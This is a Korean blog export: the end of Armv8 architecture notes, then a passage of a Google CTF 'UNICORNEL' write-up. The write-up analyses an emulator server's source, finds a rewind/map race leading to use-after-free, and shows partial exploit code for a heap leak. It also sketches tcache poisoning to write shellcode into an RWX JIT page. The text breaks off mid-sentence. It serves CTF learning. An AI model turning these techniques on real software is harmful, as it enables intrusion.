translation 에서 AP는 두 개 비트를 포함한다.\nAP 1번 비트 EL0와 더 높은 exception level 중에서 선택한다. AP 2번 비트 read only인지 read/write 가능한지 선택한다. 다음 액세스 세팅을 나타낼 수 있게 된다. 모든 레벨에서 read-only. 모든 레벨에서 read/write. EL0에선 access 불가능하지만 higher exception level에서 read-only. EL0에선 access 불가능하지만 read/write. 바로 앞에서 두 개 VA ranges를 지원할 때 higher exception level, EL0에 대한 access permission을 설명했다. 여기선 1 stage translation에서 single exception level에 대한 data access permission을 설명한다. singe exception level이라 굳이 아까 1번 비트는 있을 필요없어서 reserved 값을 가진다. 위 표처럼 정의된다. EL2 활성화시 secure / non-secure EL1\u0026amp;0 translation regime에서 S2AP는 다음 표처럼 정의된다. EL2 활성화 되어있을 때 EL1\u0026amp;0 translation regime는 2 stage address translation이 필요하다. S2AP는 1 단계 말고 2 단계 translation에 대한 access permission을 정의한다. 1 stage에서 AP랑 결합되기도 한다.\n이렇게 후속 lookups에서 어떤 영향을 주는지 볼 수 있다.\nD5.4.6 Access permissions for instruction execution Execute-never controls는 어떤 memory region의 instruction이 실행될 수 있는지를 정의한다.\nUXN, Unprivileged execute-never, stage 1 only 당연히 1 stage가 두 VA ranges를 지원해야 UXN을 쓸 수 있다. 이유는 앞서 계속 설명했으니 그냥 생략한다. 0이면 EL0에서의 execution 허용한다. XN, Execute-never single VA range면 UXN이 아니라 XN으로 정의된다. UXN과 같은 자리다. 0이면 실행을 허용한다. 이 translation 적용되는 모든 exception level에 적용된다. PXN, Privileged execute, stage 1 only 두 VA ranges 지원할 때 이용된다. single VA range는 res0으로 정의되고 무시된다. 0이면 실행이 허용된다. 그냥 SMEP랑 똑같다. XN, Execute-never, stage 2 only EL2같은거 구현되었을 때 EL1\u0026amp;0 regime 쓰면 2 stage로 해야한다. 두 번째 stage의 XN비트다. FEAT_XNX가 활성화되었을 때 이런식으로 또 나뉜다. FEAT_XNX 아니면 53bit res0이고 하나만 EL0, EL1에 대한 execution 제어를 담당한다. 추가적으로 SCTLR_ELx.WXN이 1이면 어떤 메모리던 간에 writable하면 execute-never하다. 앞에 내용들 종합해서 stage 1 access permission들 정리하면 다음과 같다. 위 표는 두 VA ranges를 지원할 때 경우이고 아래 표는 single VA range만 지원할 때의 표이다. 아까랑 똑같은데 AP의 1번 째 비트가 reserved 값이 되면서 무시된다.\nStage 2 instruction execution permissions는 아까 앞서 설명했듯이 stage 2 translation의 XN 필드에 의해 정의된다. AP도 S2AP에 의해 정의된다.\nG1.12 Handling exceptions that are taken to an Exception level using AArch32 AArch64와 exception vector tables 형태가 약간 다르다. 다음과 같은 mode로 변환되게 된다. 일반적으로 cps를 통해 다시 Supervisor로 돌린다거나 하는식으로 mode switch를 한다.\nG5.4 The VMSAv8-32 Short-descriptor translation table format AArch64와 비슷하지만 그냥 단순히 몇 번째 비트인지만 달라졌다. 위와 같은 형태이다.\nG7.3VMSAv8-32 organization of registers in the (coproc==0b1111) encoding space arm trustzone을 분석할 때 arm 모드로 동작하는 경우가 있다. 얘네들이 mrs, msr 같은 명령어를 이용해서 시스템 레지스터를 컨트롤한다. 위와 같이 테이블이 정의되어있는데, 여기에 맞춰서 mrs, msr을 읽으면 된다.\n","permalink":"https://msh1307.kr/blog/background_arm/","summary":"Background - arm A1 Introduction to the Armv8 Architecture A1.1 About Arm Architecture Arm 아키텍처는 RISC로 reduced instruction set computer이다. 다음과 같은 특징이 있다.\n많은 레지스터터 개수 load/store 아키텍처, 바로 memory에 작성을 허용치 않고 무조건 register를 거쳐서 load/store이 진행된다. 간단한 addressing mode, 모든 store/load address는 register와 명령 필드로만 addressing된다. 매우 중요한 특징으로 Arm 아키텍처 퍼포먼스나 사이즈나 전력 소모량에 따라 여러 구현이 존재한다.\nArmv8의 중요한 특징은 호환성이다.\n64-bit Execution state, AArch64 32-bit Execution state, AArch32 - 또한 이전 버전의 Arm 아키텍처와 모두 호환된다.","title":"Background ARM"},{"content":"UNICORNEL Cold Fusion 연합팀으로 Google ctf에 참여했다. 늦잠자서 늦게 합류했는데, 이미 팀원분이 취약점을 찾아놓으셔서 어떻게 악용할지를 중점적으로 생각하고 익스플로잇을 작성해서 챌린지를 해결했다.\nAnalysis ==== About ==== Unicornel is a multi-process, multi-architecture emulator server with concurrency and system call support. All processes of any architecture share the underlying kernel, and can interact with each other via system calls and in particular a lightweight shared memory interface. ==== Starting processes ==== In order to start a new process, you must first send a unicornelf header, which naturally bears no resemblance whatsoever to the actual ELF standard: struct unicornelf { uc_arch arch; //Desired unicorn-supported ISA uc_mode mode; //Desired unicorn-supported mode struct { unsigned long va; //Virtual address to map unsigned long length; //Length of memory to map } maps[4]; //Up to 4 mappings supported unsigned short code_length; //The length of the code to follow the unicornelf header unsigned char num_maps; //The number of mappings initialized in the maps array }; Following the unicornelf header should be \u0026lt;code length\u0026gt; bytes of assembled machine code in the specified instruction set architecture. NOTE: Any feedback about the unicornelf format should be submitted to: https://docs.google.com/forms/d/e/1FAIpQLSck2N2w5J84iu7CKYlGkEmwn1Xsjtl5Jmlm_4t2DfC8vwNLOw/viewform?usp=sharing\u0026amp;resourcekey=0--aU-tRVYI9eI9UCRMuEMfQ There MUST be at least one mapping specified - the first mapping ALWAYS stores the uploaded machine code. Any unused maps array elements can be set to whatever values you want, and unicornelf will dutifully ignore them. After receiving the unicornelf and \u0026lt;code length\u0026gt; bytes of machine code, the \u0026#34;process\u0026#34; will be automatically started on a new POSIX thread. The lowest available pid is assigned to the process. Bear in mind that this pid is utterly unrelated to the actual Linux tid of the thread. ==== Process Limitations ==== There can only be up to 8 processes at a time. There can only be one process per architecture at a time. (e.g. you cannot have two x86 processes) ==== Process lifetime ==== Processes execute until one of the following conditions: - The exit syscall is called by the process - The process executes the last instruction in the uploaded assembly code - The process encounters some exception condition - The client connection to the Unicornel is terminated (all processes unceremoniously terminate) ==== System Call conventions ==== The system call interface is invoked whenever an interrupt is generated by the uploaded and executing machine code. System call arguments are passed in on all architectures via registers. The system call number is always arg0 (e.g. rax on x86). The remaining 3 arguments are used to pass whatever data is needed to the syscall. The register to arguments mappings for all architectures is defined by the call_regs array. Each element index of the inner per-architecture array element corresponds to the given argument index: static unsigned int call_regs[UC_ARCH_MAX][4] = { {0,0,0,0}, //NONE {UC_ARM_REG_R0,UC_ARM_REG_R1,UC_ARM_REG_R2,UC_ARM_REG_R3}, //UC_ARCH_ARM {UC_ARM64_REG_X0,UC_ARM64_REG_X1,UC_ARM64_REG_X2,UC_ARM64_REG_X3}, //UC_ARCH_ARM64 {UC_MIPS_REG_A0,UC_MIPS_REG_A1,UC_MIPS_REG_A2,UC_MIPS_REG_A3}, //UC_ARCH_MIPS {UC_X86_REG_RAX,UC_X86_REG_RBX,UC_X86_REG_RCX,UC_X86_REG_RDX}, //UC_ARCH_X86 {UC_PPC_REG_0,UC_PPC_REG_1,UC_PPC_REG_2,UC_PPC_REG_3}, //UC_ARCH_PPC {UC_SPARC_REG_O0,UC_SPARC_REG_O1,UC_SPARC_REG_O2,UC_SPARC_REG_O3}, //UC_ARCH_SPARC {UC_M68K_REG_D0,UC_M68K_REG_D1,UC_M68K_REG_D2,UC_M68K_REG_D3}, //UC_ARCH_M68K {UC_RISCV_REG_A0,UC_RISCV_REG_A1,UC_RISCV_REG_A2,UC_RISCV_REG_A3}, //UC_ARCH_RISCV {UC_S390X_REG_R0,UC_S390X_REG_R1,UC_S390X_REG_R2,UC_S390X_REG_R3}, //UC_ARCH_S390X {UC_TRICORE_REG_D0,UC_TRICORE_REG_D1,UC_TRICORE_REG_D2,UC_TRICORE_REG_D3}, //UC_ARCH_TRICORE }; E.g. for an X86 process to call unicornel_write, you would set rax to 1 (the unicornel write syscall number), rbx to the location of the buffer to write, and rcx to the number of bytes to write. ==== Supported system calls ==== There are 11 supported system calls: Syscall Name # unicornel_exit 0 unicornel_write 1 print_integer 2 create_shared 3 map_shared 4 unmap_shared 5 bookmark 6 unicornel_rewind 7 switch_arch 8 unicornel_pause 9 unicornel_resume 10 void unicornel_exit(); Terminates the calling process This function never returns long unicornel_write(void* buf, size_t count); Write up to count bytes from the buffer at buf to the unicornel client (eventually sent over the socket). Returns the number of bytes written, or an error code if there was a failure. void-ish print_integer(long integer); Write the argument as an ASCII base-10 integer to the unicornel client. Always returns 0. long create_shared(unsigned long length); Creates a new shared memory buffer of the specified length Returns a handle to the buffer to be used with map_shared later, or an error code. long map_shared(void* addr,unsigned long length, unsigned long handle); Map a shared buffer previously created with create_shared at the address addr. Lengths less than the size of the shared buffer are ok. Returns 0 on success, or an error code. NOTE: A process can only have one shared buffer mapped at a time, but multiple processes can map the same shared buffer at the same time. long unmap_shared(); Unmaps a previously mapped shared buffer Returns 0 on success or an error code WARNING: If this was the last mapping of the shared buffer, the shared buffer will be destroyed and the handle released to be used for new created shared buffers long bookmark(); Bookmark the current processor state to return to later with rewind(). Returns 0 on success or an error code. NOTE: You can only have one bookmark at a time. Once a bookmark is created, it cannot be destroyed or reset except by switching architectures. You can rewind to the same bookmark multiple times. long unicornel_rewind(); Rewind the processor to the state previously saved by bookmark(). Returns 0 on success or an error code. NOTE: This does not rewind writes to memory, but will rewind (and unmap) shared buffers that were mapped since the bookmark\u0026#39;d processor state. WARNING: While shared buffer mappings can be rewound, shared buffer *unmappings* cannot be in order to avoid potential UAF issues. This feature may be added in future versions.... void switch_arch(uc_arch arch, uc_mode mode, void* new_pc); Switch the instruction set architecture used by this process, and long jump to new_pc Mappings (including shared mappings) and memory contents are preserved across the switch. CPU State (including registers and bookmarks) are discarded. Ensure any desired state to pass across the ISA barrier is saved to memory beforehand. This system call does not (really) \u0026#34;return\u0026#34;, and no return value is specified. NOTE: In order to prevent the numerous developer headaches that would otherwise result, a process can only transition architectures once in its lifetime. WARNING: Any shared buffer mappings have an additional refcount \u0026#34;zombified\u0026#34;. This additional reference will be destroyed when the process exits. This means that a shared buffer may not be mapped anywhere, and yet still exist and be mappable. This is not considered a bug, but it\u0026#39;s not really a feature either. void-ish unicornel_pause(); Pause the current process until another process calls unicornel_resume() with the appropriate pid This system call always succeeds, and always returns 0. long unicornel_resume(unsigned long pid) Resume the process specified by pid. Returns 0 on success, or an error code. 처음에 Docs가 주어진다. 멀티 아키텍처, 멀티 프로세스 에뮬레이터가 주어진다. 각자의 프로세스는 병렬적으로 동작하며, IPC를 위한 shared memory가 최대 하나가 매핑될 수 있었다. 소스코드도 전체가 주어져서 분석 자체는 되게 쉽게 할 수 있었다.\nint main(int argc, char *argv[]) { pfds[MAX_PROCESSES].fd = 0 /* stdin */; pfds[MAX_PROCESSES].events = POLLIN; pfds[MAX_PROCESSES].revents = 0; for(unsigned int i = 0; i \u0026lt; MAX_PROCESSES; i++) { pfds[i].fd = -1; pfds[i].events = POLLIN; pfds[i].revents = 0; } printf(\u0026#34;Welcome to the unicornel!\\n\u0026#34;); fflush(stdout); pthread_mutex_init(\u0026amp;task_lock,NULL); while(1) { poll(pfds,MAX_PROCESSES + 1,-1); for(unsigned i = 0; i \u0026lt; MAX_PROCESSES; i++) { //Data available from emulated process if(pfds[i].revents \u0026amp; POLLIN) { int nbytes; ioctl(pfds[i].fd,FIONREAD,\u0026amp;nbytes); splice(pfds[i].fd,0,1 /* stdout */,0,nbytes,0); } //Process ended, and the write end of the pipe was closed in destroy_process. Finish cleanup if(pfds[i].revents \u0026amp; POLLHUP) { close(pfds[i].fd); pfds[i].fd = -1; } } if(pfds[MAX_PROCESSES].revents \u0026amp; POLLIN) { //Received new process data start_process(); fflush(stdout); } } return 0; } 단순히 커스텀 ELF 포맷을 받아서 실행해준다.\nint start_process() { pthread_mutex_lock(\u0026amp;task_lock); int pid = find_free_process(); if(pid \u0026lt; 0) { printf(\u0026#34;At max processes already\\n\u0026#34;); pthread_mutex_unlock(\u0026amp;task_lock); return -1; } struct unicornelf process_data; //Signal to client that we\u0026#39;re ready to receive process_data printf(\u0026#34;DATA_START\\n\u0026#34;); int ret = read(0,\u0026amp;process_data,sizeof(process_data)); if(ret != sizeof(process_data)) { printf(\u0026#34;Unexpected read size\\n\u0026#34;); pthread_mutex_unlock(\u0026amp;task_lock); return -1; } if(!process_data.code_length || !process_data.num_maps || process_data.num_maps \u0026gt; 4 || process_data.code_length \u0026gt; process_data.maps[0].length) { printf(\u0026#34;Malformed process data\\n\u0026#34;); pthread_mutex_unlock(\u0026amp;task_lock); return -1; } //Only allow one process per architecture if(process_data.arch \u0026gt;= UC_ARCH_MAX || process_data.arch \u0026lt; 1 || arch_used[process_data.arch]) { printf(\u0026#34;Invalid arch specified\\n\u0026#34;); pthread_mutex_unlock(\u0026amp;task_lock); return -1; } char* code_recv = calloc(1,process_data.code_length); //Signal to client that we\u0026#39;re ready to receive process code printf(\u0026#34;CODE_START\\n\u0026#34;); fflush(stdout); read(0,code_recv,process_data.code_length); uc_engine *uc; uc_err err; err = uc_open(process_data.arch,process_data.mode,\u0026amp;uc); if(err != UC_ERR_OK) { printf(\u0026#34;Failed on uc_open() %u %u with error %u\\n\u0026#34;,process_data.arch,process_data.mode,err); pthread_mutex_unlock(\u0026amp;task_lock); free(code_recv); return -1; } for(unsigned i = 0; i \u0026lt; process_data.num_maps; i++) { err = uc_mem_map(uc,process_data.maps[i].va,process_data.maps[i].length,UC_PROT_ALL); if(err != UC_ERR_OK) { printf(\u0026#34;Failed on uc_mem_map() with error %u\\n\u0026#34;,err); free(code_recv); uc_close(uc); pthread_mutex_unlock(\u0026amp;task_lock); return -1; } } err = uc_mem_write(uc,process_data.maps[0].va,code_recv,process_data.code_length); free(code_recv); if(err != UC_ERR_OK) { printf(\u0026#34;failed on uc_mem_write() with error %u\\n\u0026#34;,err); uc_close(uc); pthread_mutex_unlock(\u0026amp;task_lock); return -1; } uc_hook trace; int pipefds[2]; pipe(pipefds); pfds[pid].fd = pipefds[0]; pfds[pid].events = POLLIN; pfds[pid].revents = 0; struct process* new_process = calloc(1,sizeof(struct process)); new_process-\u0026gt;pid = pid; new_process-\u0026gt;outfd = pipefds[1]; new_process-\u0026gt;uc = uc; new_process-\u0026gt;arch = process_data.arch; new_process-\u0026gt;entrypoint = process_data.maps[0].va; new_process-\u0026gt;code_length = process_data.code_length; new_process-\u0026gt;bookmark = NULL; new_process-\u0026gt;sbr.va = 0; new_process-\u0026gt;sbr.unmap_on_rewind = false; new_process-\u0026gt;transition = false; memcpy(new_process-\u0026gt;maps,process_data.maps,sizeof(process_data.maps)); new_process-\u0026gt;num_maps = process_data.num_maps; processes[pid] = new_process; err = uc_hook_add(uc,\u0026amp;trace,UC_HOOK_INTR,hook_call,new_process,1,0); if(err != UC_ERR_OK) { printf(\u0026#34;failed on uc_hook_add() with error %u\\n\u0026#34;,err); destroy_process(new_process); pthread_mutex_unlock(\u0026amp;task_lock); return -1; } pthread_attr_t attr; pthread_attr_init(\u0026amp;attr); pthread_attr_setdetachstate(\u0026amp;attr, PTHREAD_CREATE_DETACHED); int pthread_err = pthread_create(\u0026amp;new_process-\u0026gt;thread,\u0026amp;attr,process_thread,new_process); if(pthread_err != 0) { printf(\u0026#34;failed to create pthread\\n\u0026#34;); destroy_process(new_process); } else { printf(\u0026#34;new process created with pid %d\\n\u0026#34;,pid); arch_used[process_data.arch] = true; } pthread_mutex_unlock(\u0026amp;task_lock); return pthread_err; } 여기서 쓰레드로 병렬적으로 실행해준다.\nstruct unicornelf { uc_arch arch; uc_mode mode; struct { unsigned long va; unsigned long length; } maps[4]; unsigned short code_length; unsigned char num_maps; }; struct buffer_ref { unsigned long va; unsigned long length; unsigned handle; bool unmap_on_rewind; }; struct process { pthread_t thread; uc_arch arch; int outfd; uc_engine *uc; unsigned long entrypoint; uc_context* bookmark; struct buffer_ref sbr; struct { unsigned long va; unsigned long length; } maps[4]; unsigned short code_length; unsigned char pid; unsigned char num_maps; bool transition; bool paused; }; struct shared_buffer { volatile atomic_uint refs; void* buffer; unsigned length; }; static unsigned int call_regs[UC_ARCH_MAX][4] = { {0,0,0,0}, //NONE {UC_ARM_REG_R0,UC_ARM_REG_R1,UC_ARM_REG_R2,UC_ARM_REG_R3}, //UC_ARCH_ARM {UC_ARM64_REG_X0,UC_ARM64_REG_X1,UC_ARM64_REG_X2,UC_ARM64_REG_X3}, //UC_ARCH_ARM64 {UC_MIPS_REG_A0,UC_MIPS_REG_A1,UC_MIPS_REG_A2,UC_MIPS_REG_A3}, //UC_ARCH_MIPS {UC_X86_REG_RAX,UC_X86_REG_RBX,UC_X86_REG_RCX,UC_X86_REG_RDX}, //UC_ARCH_X86 {UC_PPC_REG_0,UC_PPC_REG_1,UC_PPC_REG_2,UC_PPC_REG_3}, //UC_ARCH_PPC {UC_SPARC_REG_O0,UC_SPARC_REG_O1,UC_SPARC_REG_O2,UC_SPARC_REG_O3}, //UC_ARCH_SPARC {UC_M68K_REG_D0,UC_M68K_REG_D1,UC_M68K_REG_D2,UC_M68K_REG_D3}, //UC_ARCH_M68K {UC_RISCV_REG_A0,UC_RISCV_REG_A1,UC_RISCV_REG_A2,UC_RISCV_REG_A3}, //UC_ARCH_RISCV {UC_S390X_REG_R0,UC_S390X_REG_R1,UC_S390X_REG_R2,UC_S390X_REG_R3}, //UC_ARCH_S390X {UC_TRICORE_REG_D0,UC_TRICORE_REG_D1,UC_TRICORE_REG_D2,UC_TRICORE_REG_D3}, //UC_ARCH_TRICORE }; static unsigned int ip_reg[UC_ARCH_MAX] = { 0, UC_ARM_REG_PC, UC_ARM64_REG_PC, UC_MIPS_REG_PC, UC_X86_REG_RIP, UC_PPC_REG_PC, UC_SPARC_REG_PC, UC_M68K_REG_PC, UC_RISCV_REG_PC, UC_S390X_REG_PC, UC_TRICORE_REG_PC }; 여러 아키텍처들을 지원한다. 핵심 데이터 구조는 위와 같이 되어있다.\nlong (*syscalls[])(struct process* current) = { unicornel_exit, unicornel_write, print_integer, create_shared, map_shared, unmap_shared, bookmark, unicornel_rewind, switch_arch, unicornel_pause, unicornel_resume }; 시스템콜도 몇개 구현되어있지 않다. syscalls.c에 시스템콜들이 모두 구현되어있다.\nlong unicornel_pause(struct process* current) { current-\u0026gt;paused = true; while(current-\u0026gt;paused); return 0; } long unicornel_resume(struct process* current) { unsigned long pid = ARG_REGR(current,1); pthread_mutex_lock(\u0026amp;task_lock); if(pid \u0026gt; MAX_PROCESSES || !processes[pid] || !processes[pid]-\u0026gt;paused) { pthread_mutex_unlock(\u0026amp;task_lock); return -1; } processes[pid]-\u0026gt;paused = false; pthread_mutex_unlock(\u0026amp;task_lock); return 0; } resume \u0026amp; pause는 다른 프로세스를 멈추고 깨우는 시스템콜이다.\nlong switch_arch(struct process* current) { //Only allow switching architectures once in order to avoid potential recursion stack overflows if(current-\u0026gt;transition) return -1; uc_arch arch = ARG_REGR(current,1); uc_mode mode = ARG_REGR(current,2); unsigned long new_pc = ARG_REGR(current,3); if(!uc_arch_supported(arch) || arch_used[arch]) { return -2; } uc_engine* new_uc; uc_engine* og_uc = current-\u0026gt;uc; uc_arch og_arch = current-\u0026gt;arch; struct buffer_ref og_sbr = current-\u0026gt;sbr; uc_err e = uc_open(arch,mode,\u0026amp;new_uc); if(e != UC_ERR_OK) { return -3; } //Add in the hook so syscalls are supported uc_hook trace; e = uc_hook_add(new_uc,\u0026amp;trace,UC_HOOK_INTR,hook_call,current,1,0); if(e != UC_ERR_OK) { uc_close(new_uc); return -5; } //Transition maps for(unsigned i = 0; i \u0026lt; current-\u0026gt;num_maps; i++) { e = uc_mem_map(new_uc,current-\u0026gt;maps[i].va,current-\u0026gt;maps[i].length,UC_PROT_ALL); if(e != UC_ERR_OK) { uc_close(new_uc); return -4; } //Transition the memory across to the new uc char* transition_buffer = malloc(current-\u0026gt;maps[i].length); if(!transition_buffer) { uc_close(new_uc); return -4; } uc_mem_read(current-\u0026gt;uc,current-\u0026gt;maps[i].va,transition_buffer,current-\u0026gt;maps[i].length); uc_mem_write(new_uc,current-\u0026gt;maps[i].va,transition_buffer,current-\u0026gt;maps[i].length); free(transition_buffer); } //Including shared regions if(og_sbr.va) { uc_mem_map_ptr(new_uc,og_sbr.va,og_sbr.length,UC_PROT_ALL,shared_buffers[og_sbr.handle].buffer); //Transitioning architectures means there\u0026#39;s now two references to the shared buffer - the original arch ref and the new arch ref shared_buffers[og_sbr.handle].refs++; current-\u0026gt;sbr.unmap_on_rewind = false; } //Destroy bookmark, because we can\u0026#39;t rewind through architectures anyway uc_context_free(current-\u0026gt;bookmark); current-\u0026gt;bookmark = NULL; //Complete transition current-\u0026gt;uc = new_uc; current-\u0026gt;arch = arch; arch_used[arch] = true; arch_used[og_arch] = false; current-\u0026gt;transition = true; uc_emu_start(new_uc,new_pc,0,0,0); //Detransition, destorying the new state and restoring the old state so destroy_process can clean up current-\u0026gt;uc = og_uc; pthread_mutex_lock(\u0026amp;task_lock); if(current-\u0026gt;sbr.va) { shared_buffers[current-\u0026gt;sbr.handle].refs--; if(shared_buffers[current-\u0026gt;sbr.handle].refs == 1) { //last reference, destroy it free(shared_buffers[current-\u0026gt;sbr.handle].buffer); shared_buffers[current-\u0026gt;sbr.handle].refs--; } } //Restore sbr, only for it to be freed in destroy_process current-\u0026gt;sbr = og_sbr; arch_used[arch] = false; pthread_mutex_unlock(\u0026amp;task_lock); uc_close(new_uc); uc_emu_stop(og_uc); return 0; } 런타임에 아키텍처의 변경을 지원한다.\nlong bookmark(struct process* current) { if(current-\u0026gt;bookmark) { return -1; } uc_err e = uc_context_alloc(current-\u0026gt;uc,\u0026amp;current-\u0026gt;bookmark); if(e == UC_ERR_OK) e = uc_context_save(current-\u0026gt;uc,current-\u0026gt;bookmark); return e; } long unicornel_rewind(struct process* current) { if(current-\u0026gt;bookmark == NULL) { return -1; } uc_err e = uc_context_restore(current-\u0026gt;uc,current-\u0026gt;bookmark); if(e != UC_ERR_OK) { //Couldn\u0026#39;t rewind so just fail out return -2; } /* If we bookmarked, then mapped a shared buffer, we need to unmap the shared buffer to * restore the original state properly. * We can skip a full unmap_shared call because we do the checking here directly. */ if(current-\u0026gt;sbr.va \u0026amp;\u0026amp; current-\u0026gt;sbr.unmap_on_rewind) { uc_err e = uc_mem_unmap(current-\u0026gt;uc,current-\u0026gt;sbr.va,current-\u0026gt;sbr.length); if(e == UC_ERR_OK) { shared_buffers[current-\u0026gt;sbr.handle].refs--; } current-\u0026gt;sbr.va = 0; current-\u0026gt;sbr.unmap_on_rewind = false; if(shared_buffers[current-\u0026gt;sbr.handle].refs == 1) { //last reference, destroy it free(shared_buffers[current-\u0026gt;sbr.handle].buffer); shared_buffers[current-\u0026gt;sbr.handle].refs--; } } return 0; } bookmark \u0026amp; rewind는 현재 context를 저장하고, 이를 다시 복원하는 시스템콜이다.\nstruct shared_buffer shared_buffers[MAX_PROCESSES] = { 0 }; long create_shared(struct process* current) { pthread_mutex_lock(\u0026amp;task_lock); unsigned long length = ARG_REGR(current,1); if(length \u0026gt; 0x10000 || !length || length \u0026amp; 0xFFF) { pthread_mutex_unlock(\u0026amp;task_lock); return -1; } //Find an empty shared buffer handle unsigned long handle; for(handle = 0; handle \u0026lt; MAX_PROCESSES; handle++) { if(!shared_buffers[handle].refs) break; } if(handle == MAX_PROCESSES) { pthread_mutex_unlock(\u0026amp;task_lock); return -2; } void* buffer = calloc(1,length); if(!buffer) { pthread_mutex_unlock(\u0026amp;task_lock); return -3; } shared_buffers[handle].refs = 1; //Set to 1 to give a chance to map it shared_buffers[handle].buffer = buffer; shared_buffers[handle].length = length; pthread_mutex_unlock(\u0026amp;task_lock); return handle; } long map_shared(struct process* current) { if(current-\u0026gt;sbr.va) { return -1; } pthread_mutex_lock(\u0026amp;task_lock); unsigned long handle = ARG_REGR(current,3); if(handle \u0026gt;= MAX_PROCESSES || !shared_buffers[handle].refs) { pthread_mutex_unlock(\u0026amp;task_lock); return -2; } unsigned long length = ARG_REGR(current,2); if(!length || length \u0026amp; 0xFFF || length \u0026gt; shared_buffers[handle].length) { pthread_mutex_unlock(\u0026amp;task_lock); return -3; } unsigned long addr = ARG_REGR(current,1); if(!addr|| addr \u0026amp; 0xFFF) { pthread_mutex_unlock(\u0026amp;task_lock); return -4; } uc_err e = uc_mem_map_ptr(current-\u0026gt;uc,addr, length,UC_PROT_ALL,shared_buffers[handle].buffer); if(e == UC_ERR_OK) { shared_buffers[handle].refs++; current-\u0026gt;sbr.handle = handle; current-\u0026gt;sbr.length = length; current-\u0026gt;sbr.va = addr; if(current-\u0026gt;bookmark) { //We need to unmap the shared mapping on rewind if we bookmarked previously current-\u0026gt;sbr.unmap_on_rewind = true; } } pthread_mutex_unlock(\u0026amp;task_lock); return e; } //The bottom reference is only ever released by destroy_shared. Any maps will increase refcount to \u0026gt; 1 long unmap_shared(struct process* current) { if(!current-\u0026gt;sbr.va) { return -1; } pthread_mutex_lock(\u0026amp;task_lock); uc_err e = uc_mem_unmap(current-\u0026gt;uc,current-\u0026gt;sbr.va,current-\u0026gt;sbr.length); if(e == UC_ERR_OK) { shared_buffers[current-\u0026gt;sbr.handle].refs--; current-\u0026gt;sbr.va = 0; current-\u0026gt;sbr.unmap_on_rewind = false; } if(shared_buffers[current-\u0026gt;sbr.handle].refs == 1) { //last reference, destroy it free(shared_buffers[current-\u0026gt;sbr.handle].buffer); shared_buffers[current-\u0026gt;sbr.handle].refs--; } pthread_mutex_unlock(\u0026amp;task_lock); return e; } shared memory create \u0026amp; mapping \u0026amp; unmapping을 지원하는 시스템 콜들도 구현되어있다. 나머지는 단순 write 시스템콜이나 아웃풋 출력 관련 시스템콜들이다.\nVulnerability long unicornel_rewind(struct process* current) { if(current-\u0026gt;bookmark == NULL) { return -1; } uc_err e = uc_context_restore(current-\u0026gt;uc,current-\u0026gt;bookmark); if(e != UC_ERR_OK) { //Couldn\u0026#39;t rewind so just fail out return -2; } /* If we bookmarked, then mapped a shared buffer, we need to unmap the shared buffer to * restore the original state properly. * We can skip a full unmap_shared call because we do the checking here directly. */ if(current-\u0026gt;sbr.va \u0026amp;\u0026amp; current-\u0026gt;sbr.unmap_on_rewind) { uc_err e = uc_mem_unmap(current-\u0026gt;uc,current-\u0026gt;sbr.va,current-\u0026gt;sbr.length); if(e == UC_ERR_OK) { shared_buffers[current-\u0026gt;sbr.handle].refs--; } current-\u0026gt;sbr.va = 0; current-\u0026gt;sbr.unmap_on_rewind = false; if(shared_buffers[current-\u0026gt;sbr.handle].refs == 1) { //last reference, destroy it free(shared_buffers[current-\u0026gt;sbr.handle].buffer); shared_buffers[current-\u0026gt;sbr.handle].refs--; } } return 0; } rewind에서 lock이 구현되지 않아서 map \u0026amp; unmap 등에서 공유 자원 접근에 lock이 걸려있어도 race가 발생하며 특정 케이스에서는 메모리 취약점까지 연계될 수 있다.\nExploit race를 악용하기 위해서 생각했던 방식은 rewind syscall과 map을 겹쳐 race를 일으키는 방식이였다. 성공하면 UAF를 얻게 된다.\npid 0 : save ctx -\u0026gt; pause -\u0026gt; map shared -\u0026gt; resume 1 -\u0026gt; rewind pid 1 : create shared -\u0026gt; resume 0 -\u0026gt; pause -\u0026gt; map shared 실질적으로 저렇게 pause 하고 프로세스 실행시키면 rewind와 map shared를 최대한 겹칠 수 있다. rewind 이전에 shared memory가 매핑되어야 rewind시에 flag가 세팅되고 unmap이 내부적으로 발생한다. flag가 세팅되었다고 가정하고 다음과 같은 내부 동작으로 간단하게 표현할 수 있다.\n[MAP] 1) if refs != 0 -\u0026gt; cont 2) refs += 1 3) map_internal() [REWIND] 1) refs -= 1 2) if refs == 1 -\u0026gt; cont 3) free mem 4) refs -= 1 pid 0 : map -\u0026gt; ref count = 2 pid 0 : rewind - (1) -\u0026gt; ref count = 1 pid 0 : rewind - (3) -\u0026gt; memory free pid 1 : map - (1) -\u0026gt; ref count = 1, condition bypassed 위 순서가 지켜지면 이 이후의 ref count가 어떻게 연산되던간에 변경되더라도 메모리 버그로 연계된다. 위 시나리오로 코드를 작성해서 성공적으로 race가 발생하면 해당 쓰레드 힙의 fd가 릭되며 쓰레드 힙 주소를 릭할 수 있다.\n# pid 1 code = \u0026#39;\u0026#39; code += \u0026#39;mov rsp, 0x2000\\n\u0026#39; code += \u0026#39;retry:\\n\u0026#39; code += create_shared_x86(0x1000) code += resume_x86(0) code += pause_x86() code += map_shared_x86(0x5000, 0x1000, 0) # handle 0 code += \u0026#39;\u0026#39;\u0026#39;\\ mov rdi, 0x5000 mov rax, [rdi] cmp rax, 0 jne success \u0026#39;\u0026#39;\u0026#39; 그리고 위와 같이 따로 판별 로직을 추가해서 race의 성공, 실패 여부를 판별하고 이를 통해 안정적으로 메모리를 유출할 수 있다.\n위와 같은 메모리 레이아웃을 가지는데, 여기서 rwx로 매핑된 JIT page를 발견할 수 있었고, 이러한 JIT page는 자체적인 랜덤화가 적용된 것으로 보이며 성공적인 RCE를 위해서 JIT page를 타겟팅하기로 결정했다.\nInitial Attempt 처음 시도했던 시나리오는 다음과 같다. 쓰레드 힙에서의 UAF를 통해 쓰레드 힙 주소를 유출했을때 JIT page는 엔트로피가 생각보다 적어 정확한 base를 유출할 수는 없지만 rwx 페이지 자체를 확률적으로 구할 수 있다. 이 방법으로 공격을 시도하려면 UAF를 통해 fd를 조작하고 tache에서 AAW를 달성해 JIT page에 청크를 할당해 악의적인 쉘코드를 작성하는 방식으로 공격을 시도해야한다. 사용자가 메모리를 마음대로 할당만 가능하다면, 후속 할당은 free된 메모리의 일부가 reclaim 되는 방식으로 메모리가 할당되기 때문에 fd를 변조하여 연결리스트를 오염시킬 수 있다.\n위 시나리오는 사용자가 마음대로 메모리를 할당할 수 있어야만 가능한 시나리오였고 일반적인 방법으로는 메모리를 두 번이상 연속적으로 할당이 불가능했다.\nFinal Exploit Scenario 그래서 다른 시나리오를 생각해보기로 